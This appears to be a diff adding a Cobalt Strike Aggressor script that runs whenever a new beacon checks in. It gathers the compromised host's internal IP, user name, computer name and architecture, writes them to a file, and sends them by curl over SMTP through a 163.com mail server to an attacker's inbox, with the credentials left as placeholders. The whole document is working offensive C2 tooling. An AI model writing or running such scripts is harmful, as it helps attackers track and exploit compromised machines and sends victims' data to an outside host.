@@ -1,0 +1,20 @@
+$From = "xxxxx@163.com";
+$To = "xxxxx@qq.com";
+$UserName = "xxxx";
+$Password = "xxxxx";
+$SmtpServer = "smtp://smtp.163.com";
+
+
+on beacon_initial{
+    local('$Ip $User $ComName $Arch $Handle $Mail_content');
+    $IP = beacon_info($1, "internal");
+    $User = beacon_info($1, "user");
+    $ComName = beacon_info($1, "computer");
+    $Arch = beacon_info($1, "barch");
+    $Mail_content = "From:".$From."\r\nTo:".$To."\r\nSubject:CobaltStriker\r\n\r\nIP:".$IP."\r\nUser:".$User."\r\nComputerName:".$ComName."\r\nArch:".$Arch;
+    $Handle = openf(">mail.txt");
+    writeb($Handle, $Mail_content);
+    @Curl_command = @('curl', '-s' ,'--url', $SmtpServer, '--mail-from', $From, '--mail-rcpt', $To, '--upload-file','mail.txt', '--user', $UserName.':'.$Password);
+    exec(@Curl_command);
+    action("\c9Send Done: ".$ComName."!");
+}
